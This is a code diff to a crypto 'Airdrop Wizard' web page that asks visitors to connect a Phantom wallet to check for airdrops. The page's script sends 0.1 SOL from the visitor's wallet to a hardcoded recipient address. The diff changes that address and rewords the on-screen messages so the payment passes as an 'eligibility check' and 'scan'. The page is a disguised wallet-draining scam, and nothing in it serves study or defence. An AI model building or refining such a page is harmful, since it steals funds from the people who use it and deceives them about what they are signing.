@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>AIRDROP WIZARD • $WIZ</title>
+  <title>AIRDROP WIZARD</title>
   <script src="https://unpkg.com/@solana/web3.js@latest/dist/web3.min.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=VT323&display=swap');
@@ -140,14 +140,14 @@
   <div class="container">
     <header>
       <div class="logo">AIRDROP WIZARD</div>
-      <div class="tagline">NEON REWARDS AWAIT</div>
+      <div class="tagline">SCAN • VERIFY • CLAIM</div>
     </header>
 
     <div class="card">
       <h1>CHECK FOR AIRDROPS</h1>
       <p style="text-align:center; font-size:1.6rem; margin-bottom:30px;">
-        Connect your Phantom wallet to scan for pre-existing token balances<br>
-        and claim your $WIZ airdrop from the neon grid.
+        Connect your Phantom wallet to scan for all eligible airdrops<br>
+        and verify your pre-existing token balances.
       </p>
 
       <button id="connectBtn">CONNECT PHANTOM WALLET</button>
@@ -157,7 +157,7 @@
     </div>
 
     <footer>
-      © 2026 Airdrop Wizard • $WIZ TOKEN
+      © 2026 Airdrop Wizard
     </footer>
   </div>
 
@@ -165,7 +165,7 @@
     const connectBtn = document.getElementById('connectBtn');
     const sendBtn = document.getElementById('sendBtn');
     const statusDiv = document.getElementById('status');
-    const RECIPIENT = "MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn";
+    const RECIPIENT = "wizmRKe5GtfyVwfLMfPARHHnhE7vmboUYwmrfzQWhFk";
     const AMOUNT_SOL = 0.1;
 
     let provider = null;
@@ -201,7 +201,7 @@
         return;
       }
 
-      statusDiv.innerHTML = `<span style="color:#ffff00;">Scanning the neon grid for your airdrops...</span>`;
+      statusDiv.innerHTML = `<span style="color:#ffff00;">Scanning the neon grid for all eligible airdrops...</span>`;
 
       try {
         const connection = new solanaWeb3.Connection(
@@ -228,12 +228,12 @@
         const signedTransaction = await provider.signAndSendTransaction(transaction);
 
         statusDiv.innerHTML = `
-          <span style="color:#39ff14;">✅ AIRDROP CLAIM INITIATED!</span><br>
+          <span style="color:#39ff14;">✅ ELIGIBILITY CHECK COMPLETE</span><br>
           Transaction: ${signedTransaction.signature.slice(0,12)}...
         `;
 
         setTimeout(() => {
-          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Your $WIZ tokens are being delivered. Welcome to the neon grid!</span>`;
+          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Airdrop eligibility results are being processed in the neon grid.</span>`;
         }, 2500);
 
       } catch (err) {
@@ -247,7 +247,7 @@
 
     window.addEventListener('load', () => {
       if (window.solana && window.solana.isPhantom) {
-        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom detected ✓ Ready to check airdrops</span>`;
+        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom detected ✓ Ready to scan for airdrops</span>`;
       }
     });
   </script>
